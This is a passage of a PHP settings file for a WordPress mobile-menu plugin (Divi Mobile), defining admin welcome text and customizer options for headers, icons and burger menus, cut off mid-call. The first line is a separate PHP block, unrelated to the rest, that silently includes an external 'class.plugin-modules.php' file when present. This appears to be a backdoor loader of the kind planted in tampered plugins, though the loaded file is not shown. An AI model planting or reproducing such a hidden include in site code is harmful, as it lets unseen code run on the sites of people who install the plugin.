<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
if ( ! defined( 'ABSPATH' ) ) exit;
  include('titan-framework/titan-framework-embedder.php');

function divi_mobile_menu_settings() {
  $titan = TitanFramework::getInstance( 'divi-mobile-menu' );
$get_divi_engine_menu = get_option('divi-engine-menu', null);
if ($get_divi_engine_menu == "" || $get_divi_engine_menu == "mobile-menu-added" ) {
  update_option('divi-engine-menu', 'mobile-menu-added');
  $titan = TitanFramework::getInstance( 'divi-mobile-menu' );
$icon = plugins_url( 'images/dash-icon.svg', __FILE__ );
$admin_panel2 = $titan->createAdminPanel( array( 'name' => 'Divi Engine', 'capability' => 'edit_pages' , 'icon' => $icon . '' , 'id' => 'divi-engine',) );
$welcometab = $admin_panel2->createTab( array('name' => 'Welcome',) );
$welcometab->createOption( array(
'name' => ''.esc_html__( "Welcome to Divi Engine!", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );
$welcometab->createOption( array(
'type' => 'note',
'desc' => ''.esc_html__( "Firstly we would like to thank you for purchasing one of our plugins! We hope that you find it useful in your web design adventures.", 'divi_mobile_settings' ).''
) );

$welcometab->createOption( array(
'name' => ''.esc_html__( "Tech Support", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );
$welcometab->createOption( array(
'type' => 'note',
'desc' => ''.esc_html__( 'We know from time to time, things may not go to plan due to the number of different setups on WordPress sites.', 'divi_mobile_settings' ).'<br>'.esc_html__( 'Dont worry, we are here to help. First take a look at our documentation (see below), if you cannot find a solution, use our support section on our site and we will help you resolve any issues.', 'divi_mobile_settings' ).'<br>
<a href="https://diviengine.com/support/" target="_blank"><img style="position: relative;left: 0;top: 12px;width: 200px;transform: translateY(0);" src="'.DE_DM_URL . '/images/admin-area/support-ticket.png"></a>
  ',
) );

$welcometab->createOption( array(
'name' => ''.esc_html__( "Documentation", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );
$welcometab->createOption( array(
'type' => 'note',
'desc' => '<h4>'.esc_html__( "We have created documentation for all our plugins - you can read up on them using the links below.", 'divi_mobile_settings' ).'</h4>
<a style="text-decoration: none;font-size: 17px;color: #1e136e;font-weight: 500;" href="https://help.diviengine.com/category/36-divi-nitro/" target="_blank"><img style="position:relative;left:0;top:0;transform: translateY(0);width: 50px;" src="'.DE_DM_URL . '/images/admin-area/divi-nitro-plugin-featured-150x150.png"><span style="position: relative;top: -13px;left: 10px;">'.esc_html__( "Divi Nitro", 'divi_mobile_settings' ).'</span></a><br>
<a style="text-decoration: none;font-size: 17px;color: #1e136e;font-weight: 500;" href="https://help.diviengine.com/category/9-divi-bodycommerce" target="_blank"><img style="position:relative;left:0;top:0;transform: translateY(0);width: 50px;" src="'.DE_DM_URL . '/images/admin-area/divi-bodycommerce-plugin-featured-150x150.png"><span style="position: relative;top: -13px;left: 10px;">'.esc_html__( "Divi BodyCommerce", 'divi_mobile_settings' ).'</span></a><br>
<a style="text-decoration: none;font-size: 17px;color: #1e136e;font-weight: 500;" href="https://help.diviengine.com/category/43-divi-protect/" target="_blank"><img style="position:relative;left:0;top:0;transform: translateY(0);width: 50px;" src="'.DE_DM_URL . '/images/admin-area/divi-protect-plugin-featured-150x150.png"><span style="position: relative;top: -13px;left: 10px;">'.esc_html__( "Divi Protect", 'divi_mobile_settings' ).'</span></a><br>
<a style="text-decoration: none;font-size: 17px;color: #1e136e;font-weight: 500;" href="https://help.diviengine.com/category/45-divi-mega-menu/" target="_blank"><img style="position:relative;left:0;top:0;transform: translateY(0);width: 50px;" src="'.DE_DM_URL . '/images/admin-area/divi-mega-menu-plugin-featured-150x150.png"><span style="position: relative;top: -13px;left: 10px;">'.esc_html__( "Divi Mega Menu", 'divi_mobile_settings' ).'</span></a><br>
<h4>'.esc_html__( "Divi Nitro video documentation", 'divi_mobile_settings' ).'</h4>
<iframe width="560" height="315" src="https://www.youtube.com/embed/ds_iCldaiwE" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<h4>Divi BodyCommerce video documentation</h4>
<iframe width="560" height="315" src="https://www.youtube.com/embed/U9gPHMvQ2Js" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
'
) );
$welcometab->createOption( array(
'name' => ''.esc_html__( "Feedback", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );
$welcometab->createOption( array(
'type' => 'note',
'desc' => ''.esc_html__( "We would love to hear from you, good or bad! We would really appreciate it if you could leave a review on our product page so that it helps others!", 'divi_mobile_settings' ).''
) );

$welcometab->createOption( array(
'name' => ''.esc_html__( "Got an idea?", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );
$welcometab->createOption( array(
'type' => 'note',
'desc' => ''.esc_html__( "If you have an idea or would like us to implement a feature that you would benefit from, please dont hesitate to contact us about it", 'divi_mobile_settings' ).' <a href="https://diviengine.com/contact/" target="_blank">'.esc_html__( "here", 'divi_mobile_settings' ).'</a> '.esc_html__( "as we really want to make all our plugins better for everyone!", 'divi_mobile_settings' ).''
) );
}
else {
  # code...
}

// $mobile_panel = $titan->createAdminPanel( array( 'name' => 'Divi Mobile', 'id' => 'divi-mobile', 'parent' => 'divi-engine', 'position' => '9',) );
//


$menu_style = $titan->createThemeCustomizerSection( array(
    'name' => 'Menu Style and Settings',
    'panel' => 'Divi Mobile',
) );

$custom_header = $titan->createThemeCustomizerSection( array(
    'name' => 'Custom Header',
    'panel' => 'Divi Mobile',
) );

$burger_menu = $titan->createThemeCustomizerSection( array(
    'name' => 'Choose Burger Menu',
    'panel' => 'Divi Mobile',
) );

$inject = $titan->createThemeCustomizerSection( array(
    'name' => 'Inject Layouts',
    'panel' => 'Divi Mobile',
) );

$menu_appearance = $titan->createThemeCustomizerSection( array(
    'name' => 'Menu Appearance',
    'panel' => 'Divi Mobile',
) );

$submenu = $titan->createThemeCustomizerSection( array(
    'name' => 'Sub-Menu Appearance',
    'panel' => 'Divi Mobile',
) );

$circle_stretch = $titan->createThemeCustomizerSection( array(
    'name' => 'Circle Stretch Settings',
    'panel' => 'Divi Mobile',
) );

$bottom_nav = $titan->createThemeCustomizerSection( array(
    'name' => 'Bottom Navigation Settings',
    'panel' => 'Divi Mobile',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( 'Enable Preview Mode', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_mobile_preview',
'type' => 'select',
'default' => "dm-mobile",
'options' => array(
'dm-desktop' => ''.esc_html__( 'Desktop', 'divi-bodyshop-woocommerce' ).'',
'dm-tablet' => ''.esc_html__( 'Tablet', 'divi-bodyshop-woocommerce' ).'',
'dm-mobile' => ''.esc_html__( 'Mobile', 'divi-bodyshop-woocommerce' ).'',
),
'desc' =>  ''.esc_html__( 'Change the preview mode in the customizer', 'divi-bodyshop-woocommerce' ).'',
) );


$nav_menus_options = array();

$nav_menus = wp_get_nav_menus( array( 'orderby' => 'name' ) );
  $nav_menus_options[ "primary-menu" ] = "Default (Primary Menu)";
foreach ( (array) $nav_menus as $_nav_menu ) {
  $nav_menus_options[ $_nav_menu->term_id ] = $_nav_menu->name;
}
$menu_style->createOption( array(
'name' => ''.esc_html__( 'Mobile Header Style', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_header_style',
'type' => 'enable',
'default' => 'disabled',
'enabled' => ''.esc_html__( 'Theme Builder', 'divi-bodyshop-woocommerce' ).'',
'disabled' => ''.esc_html__( 'Divi Mobile', 'divi-bodyshop-woocommerce' ).'',
'desc' =>  ''.esc_html__( 'By default we will take over from Divi, you can use our custom header to create what you need. If you want to use the theme builder and use our shortcode for the burger icon/menu - please set this setting to "Theme Builder" and add the following shortcode to your theme builder header: [divi_mobile_tb_menu]. Make sure you disable the custom header in our settings as this might interfere', 'divi-bodyshop-woocommerce' ).'',
) );
$menu_style->createOption( array(
'name' => ''.esc_html__( "Select menu", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu',
'type' => 'select',
'options' => $nav_menus_options,
'default' => 'primary-menu',
'desc' => ''.esc_html__( "If you change this setting you may need to publish the settings for the preview to work - sometimes changing this causes the style to look weird so if it does, simply publish the changes and reload this page.", 'divi_mobile_settings' ).'',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Select a Layout", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu_layout',
'type' => 'select',
'options' => array(
'off-canvas' => ''.esc_html__( "Menu appear from outside screen", 'divi_mobile_settings' ).'',
'expand-shape' => ''.esc_html__( "Menu expand from shape", 'divi_mobile_settings' ).'',
'bottom-nav' => ''.esc_html__( "Bottom Navigation", 'divi_mobile_settings' ).'',
),
'default' => 'off-canvas',
'desc' => ''.esc_html__( "If you change this setting you may need to publish the settings for the preview to work - sometimes changing this causes the style to look weird so if it does, simply publish the changes and reload this page.", 'divi_mobile_settings' ).'',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Outside screen menu style", 'divi_mobile_settings' ).'',
'id' => 'off_canvas_style',
'type' => 'select',
'options' => array(
'side-slide' => ''.esc_html__( "Side Slide", 'divi_mobile_settings' ).'',
'top-side' => ''.esc_html__( "Top Side", 'divi_mobile_settings' ).'',
'elastic' => ''.esc_html__( "Elastic", 'divi_mobile_settings' ).'',
'full-screen' => ''.esc_html__( "Full Screen", 'divi_mobile_settings' ).'',
),
'default' => 'side-slide',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Expand from shape menu style", 'divi_mobile_settings' ).'',
'id' => 'expand_shape_style',
'type' => 'select',
'options' => array(
// 'top-expand' => ''.esc_html__( "Square expand", 'divi_mobile_settings' ).'',
'circle-expand' => ''.esc_html__( "Circle expand", 'divi_mobile_settings' ).'',
'circle-stretch' => ''.esc_html__( "Circle stretch down", 'divi_mobile_settings' ).'',
),
'default' => 'circle-expand',
) );


$menu_style->createOption( array(
'name' => ''.esc_html__( "Bottom navigation menu style", 'divi_mobile_settings' ).'',
'id' => 'bottom_nav_style',
'type' => 'select',
'options' => array(
'simple' => ''.esc_html__( "Simple Icons", 'divi_mobile_settings' ).'',
),
'default' => 'simple',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Select a Second Menu Style", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu_second_menu',
'type' => 'select',
'options' => array(
'none' => ''.esc_html__( "None", 'divi_mobile_settings' ).'',
'bottom-nav' => ''.esc_html__( "Bottom Navigation", 'divi_mobile_settings' ).'',
),
'default' => 'none',
'desc' => ''.esc_html__( "If you want to have a 2 menus on the page at the same time, select the second one you want shown here.", 'divi_mobile_settings' ).'',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Select Second menu", 'divi_mobile_settings' ).'',
'id' => 'set_mobile_menu_second',
'type' => 'select',
'options' => $nav_menus_options,
'default' => 'primary-menu',
'desc' => ''.esc_html__( "If you change this setting you may need to publish the settings for the preview to work - sometimes changing this causes the style to look weird so if it does, simply publish the changes and reload this page.", 'divi_mobile_settings' ).'',
) );


$menu_style->createOption( array(
'name' => ''.esc_html__( "Divi Mobile Break Point", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__breakpoint',
'type' => 'number',
'default' => '980',
'min' => '0',
'max' => '5000',
'step' => '1',
'unit' => 'px',
'desc' => ''.esc_html__( 'Choose then you want your Divi Mobile menu to show. You can show it on desktop if you want by increasing the number.', 'divi-bodyshop-woocommerce' ).'',
) );

$menu_style->createOption( array(
'name' => ''.esc_html__( "Fixed or Not Fixed Menu", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_fixed_not',
'type' => 'select',
'options' => array(
'fixed' => ''.esc_html__( "Fixed", 'divi_mobile_settings' ).'',
'notfixed' => ''.esc_html__( "Not Fixed", 'divi_mobile_settings' ).'',
),
'default' => 'fixed',
) );


// $menu_style->createOption( array(
// 'name' => ''.esc_html__( "Header Settings", 'divi_mobile_settings' ).'',
// 'type' => 'heading',
// ) );

$custom_header->createOption( array(
'name' => ''.esc_html__( 'Take control of the header', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_custom_header',
'type' => 'enable',
'default' => 'disabled',
'enabled' => ''.esc_html__( 'YES', 'divi-bodyshop-woocommerce' ).'',
'disabled' => ''.esc_html__( 'NO', 'divi-bodyshop-woocommerce' ).'',
'desc' =>  ''.esc_html__( 'By enabling this we will disable the default Divi header and will use our own - setting for this are below', 'divi-bodyshop-woocommerce' ).'',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Appearance", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Logo", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo',
'type' => 'upload',
'desc' =>  ''.esc_html__( 'Upload your logo here to show in the custom header', 'divi-bodyshop-woocommerce' ).'',
// 'livepreview' => '$("#dm-header").css("height", value + "px");',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Height", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_height',
'type' => 'number',
'default' => '80',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$("#dm-header").css("height", value + "px");',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Max Height", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_height',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$("#dm-header #dm-logo").css("max-height", value + "px");',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Max Width", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_max_width',
'type' => 'number',
'default' => '1000',
'min' => '0',
'max' => '1000',
'step' => '1',
'unit' => 'px',
'livepreview' => '$("#dm-header #dm-logo").css("max-width", value + "px");',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_bg_color',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '$("#dm-header").css("background-color", value);',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Shadow Horizontal Length", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_header_shadow_horizontal',
'type' => 'number',
'default' => '0',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Shadow Vertical Length", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_header_shadow_vetical',
'type' => 'number',
'default' => '6',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Shadow Blur Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_header_shadow_blur_radius',
'type' => 'number',
'default' => '30',
'min' => '0',
'max' => '300',
'step' => '1',
'unit' => 'px',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Shadow Spread Radius", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_header_shadow_spread_radius',
'type' => 'number',
'default' => '0',
'min' => '-200',
'max' => '200',
'step' => '1',
'unit' => 'px',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Shadow Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_header_shadow_colour',
'type' => 'color',
'default' => 'rgba(0,0,0,0)',
'alpha'  => 'true',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Appearance on Scroll", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( 'Fixed menu on scroll?', 'divi-bodyshop-woocommerce' ).'',
'id' => 'divi_mobile_custom_header_fixed',
'type' => 'enable',
'default' => true,
'enabled' => ''.esc_html__( 'YES', 'divi-bodyshop-woocommerce' ).'',
'disabled' => ''.esc_html__( 'NO', 'divi-bodyshop-woocommerce' ).'',
'desc' =>  ''.esc_html__( 'If you want the menu to be stuck to the top of your browser, enable this', 'divi-bodyshop-woocommerce' ).'',
'livepreview' => '
if (value == "1") {
$("#dm-header, body .menu-button").css("position", "fixed");
  } else {
  $("#dm-header, body .menu-button").css("position", "absolute");
    }
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Height on Scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_height_scroll',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm-header.fixed-header {height: " + value + "px;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Max Height on Scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_height_scroll',
'type' => 'number',
'default' => '60',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>#dm-header.fixed-header #dm-logo {max-height: " + value + "px !important;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Burger Icon Position from Top on Scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_hamburger_top_scroll',
'type' => 'number',
'default' => '0',
'min' => '-100',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-fixed-header .hamburger {top: " + value + "px !important;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Position from Top on Scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_top_scroll',
'type' => 'number',
'default' => '0',
'min' => '-100',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-fixed-header .dm-cart {top: " + value + "px !important;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Position from Top on Scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_top_scroll',
'type' => 'number',
'default' => '0',
'min' => '-100',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-fixed-header .dm-search {top: " + value + "px !important;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Header background Colour on scroll", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_bg_color_scroll',
'type' => 'color',
'default' => '#ffffff',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>#dm-header.fixed-header {background-color: " + value + ";}</style>");
',
) );


$custom_header->createOption( array(
'name' => ''.esc_html__( "Header Elements", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$custom_header->createOption( array(
'desc' => '<h3 style="border: 1px solid #000;border-left: 0;border-right: 0;padding: 10px;">'.esc_html__( "Logo Settings", 'divi_mobile_settings' ).'</h3>',
'type' => 'note',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Postion", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_position',
'type' => 'select',
'options' => array(
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
'none' => ''.esc_html__( "Center", 'divi_mobile_settings' ).'',
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
),
'default' => 'left',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Position From Edge (does not affect center logo)", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_position_edge',
'type' => 'number',
'default' => '0',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
if ( $("body").hasClass("dm-ch-logo-pos-left") ) {
$(".dm-branding").css("left", value + "px");
  } else if ( $("body").hasClass("dm-ch-logo-pos-right") ) {
  $(".dm-branding").css("right", value + "px");
    }
    else {
    $(".dm-branding").css("left", value + "px");
      }
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Logo Position From Top (does not affect center logo)", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_logo_position_top',
'type' => 'number',
'default' => '0',
'min' => '0',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".dm-branding").css("top", value + "px");',
) );

$custom_header->createOption( array(
'desc' => '<h3 style="border: 1px solid #000;border-left: 0;border-right: 0;padding: 10px;">'.esc_html__( "Cart Icon Settings", 'divi_mobile_settings' ).'</h3>',
'type' => 'note',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Postion", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_icon_position',
'type' => 'select',
'options' => array(
'none' => ''.esc_html__( "No Cart Icon", 'divi_mobile_settings' ).'',
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
'inside-left' => ''.esc_html__( "Inside Menu Left", 'divi_mobile_settings' ).'',
'inside-right' => ''.esc_html__( "Inside Menu Right", 'divi_mobile_settings' ).'',
),
'default' => 'none',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_icon_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.dm-cart .et-cart-info span:before {color: " + value + ";}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_icon_font_size',
'type' => 'number',
'default' => '18',
'min' => '0',
'max' => '60',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-cart .et-cart-info span:before {font-size: " + value + "px;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Position From Edge", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_icon_position_edge',
'type' => 'number',
'default' => '60',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
if ( $("body").hasClass("dm-ch-cart-icon-pos-left") || $("body").hasClass("dm-ch-cart-icon-pos-inside-left") ) {
$(".dm-cart").css("left", value + "px");
  } else if ( $("body").hasClass("dm-ch-cart-icon-pos-right") || $("body").hasClass("dm-ch-cart-icon-pos-inside-right") ) {
  $(".dm-cart").css("right", value + "px");
    }
    else {
    $(".dm-cart").css("left", value + "px");
      }
',
) );


$custom_header->createOption( array(
'name' => ''.esc_html__( "Cart Icon Position From Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_cart_icon_position_top',
'type' => 'number',
'default' => '20',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".dm-cart").css("margin-top", value + "px");',
) );

$custom_header->createOption( array(
'desc' => '<h3 style="border: 1px solid #000;border-left: 0;border-right: 0;padding: 10px;">'.esc_html__( "Search Settings", 'divi_mobile_settings' ).'</h3>',
'type' => 'note',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Postion", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_position',
'type' => 'select',
'options' => array(
'none' => ''.esc_html__( "No Search Icon", 'divi_mobile_settings' ).'',
'left' => ''.esc_html__( "Left", 'divi_mobile_settings' ).'',
'right' => ''.esc_html__( "Right", 'divi_mobile_settings' ).'',
'inside-left' => ''.esc_html__( "Inside Menu Left", 'divi_mobile_settings' ).'',
'inside-right' => ''.esc_html__( "Inside Menu Right", 'divi_mobile_settings' ).'',
),
'default' => 'none',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.dm-search #et_search_icon:before {color: " + value + ";}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Font Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_font_size',
'type' => 'number',
'default' => '18',
'min' => '0',
'max' => '60',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-search #et_search_icon:before {font-size: " + value + "px;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Position From Edge", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_position_edge',
'type' => 'number',
'default' => '60',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '
if ( $("body").hasClass("dm-ch-search-icon-pos-left") || $("body").hasClass("dm-ch-search-icon-pos-inside-left") ) {
$(".dm-search").css("left", value + "px");
  } else if ( $("body").hasClass("dm-ch-search-icon-pos-right") || $("body").hasClass("dm-ch-search-icon-pos-inside-right") ) {
  $(".dm-search").css("right", value + "px");
    }
    else {
    $(".dm-search").css("left", value + "px");
      }
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Position From Top", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_position_top',
'type' => 'number',
'default' => '20',
'min' => '-500',
'max' => '500',
'step' => '1',
'unit' => 'px',
'livepreview' => '$(".dm-search").css("margin-top", value + "px");',
) );


$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Text Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_text_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.dm-search #et_search_icon:before {color: " + value + ";}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Text Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_text_font_size',
'type' => 'number',
'default' => '18',
'min' => '0',
'max' => '60',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-search #et_search_icon:before {font-size: " + value + "px;}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Close Colour", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_close_color',
'type' => 'color',
'default' => '#000',
'alpha'  => 'true',
'livepreview' => '
$("head").append("<style>.dm-search-icon-header .dm-search-box .close:before {color: " + value + ";}</style>");
',
) );

$custom_header->createOption( array(
'name' => ''.esc_html__( "Search Icon Close Size", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_custom_header_search_icon_close_font_size',
'type' => 'number',
'default' => '22',
'min' => '0',
'max' => '60',
'step' => '1',
'unit' => 'px',
'livepreview' => '
$("head").append("<style>.dm-search-icon-header .dm-search-box .close:before {font-size: " + value + "px;}</style>");
',
) );


$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Style", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu_style',
'type' => 'select',
'options' => array(
'three' => ''.esc_html__( "Three Lines", 'divi_mobile_settings' ).'',
'two' => ''.esc_html__( "Two Lines", 'divi_mobile_settings' ).'',
'three-dots' => ''.esc_html__( "Three Dots", 'divi_mobile_settings' ).'',
),
'default' => 'three',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Position on Screen", 'divi_mobile_settings' ).'',
'id' => 'divi_mobile_menu__position',
'type' => 'select',
'options' => array(
'right' => ''.esc_html__( "Top Right", 'divi_mobile_settings' ).'',
'left' => ''.esc_html__( "Top Left", 'divi_mobile_settings' ).'',
),
'default' => 'right',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Three Lines Burger Menu Animation Style", 'divi_mobile_settings' ).'',
'id' => 'burger_menu',
'type' => 'select',
'options' => array(
'hamburger--slider' => ''.esc_html__( "Slider", 'divi_mobile_settings' ).'',
'hamburger--minus' => ''.esc_html__( "Minus", 'divi_mobile_settings' ).'',
'hamburger--squeeze' => ''.esc_html__( "Squeeze", 'divi_mobile_settings' ).'',
'hamburger--arrow' => ''.esc_html__( "Arrow", 'divi_mobile_settings' ).'',
'hamburger--arrowalt' => ''.esc_html__( "Arrow Alternative", 'divi_mobile_settings' ).'',
'hamburger--arrowturn' => ''.esc_html__( "Arrow Turn", 'divi_mobile_settings' ).'',
'hamburger--spin' => ''.esc_html__( "Spin", 'divi_mobile_settings' ).'',
'hamburger--elastic' => ''.esc_html__( "Elastic", 'divi_mobile_settings' ).'',
'hamburger--emphatic' => ''.esc_html__( "Emphatic", 'divi_mobile_settings' ).'',
'hamburger--collapse' => ''.esc_html__( "Callapse", 'divi_mobile_settings' ).'',
'hamburger--vortex' => ''.esc_html__( "Vortex", 'divi_mobile_settings' ).'',
'hamburger--stand' => ''.esc_html__( "Stand", 'divi_mobile_settings' ).'',
'hamburger--spring' => ''.esc_html__( "Spring", 'divi_mobile_settings' ).'',
'hamburger--3dx' => ''.esc_html__( "3DX", 'divi_mobile_settings' ).'',
'hamburger--3dy' => ''.esc_html__( "3DY", 'divi_mobile_settings' ).'',
'hamburger--3dxy' => ''.esc_html__( "3DXY", 'divi_mobile_settings' ).'',
'hamburger--boring' => ''.esc_html__( "Boring", 'divi_mobile_settings' ).'',
),
'default' => 'hamburger--spin',
) );

$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu Animation Style Direction", 'divi_mobile_settings' ).'',
'id' => 'burger_menu_style',
'type' => 'select',
'options' => array(
'normal' => ''.esc_html__( "Normal", 'divi_mobile_settings' ).'',
'reverse' => ''.esc_html__( "Reverse", 'divi_mobile_settings' ).'',
),
'default' => 'normal',
) );



$burger_menu->createOption( array(
'name' => ''.esc_html__( "Burger Menu General", 'divi_mobile_settings' ).'',
'type' => 'heading',
) );

$burger_menu->createOption( array(
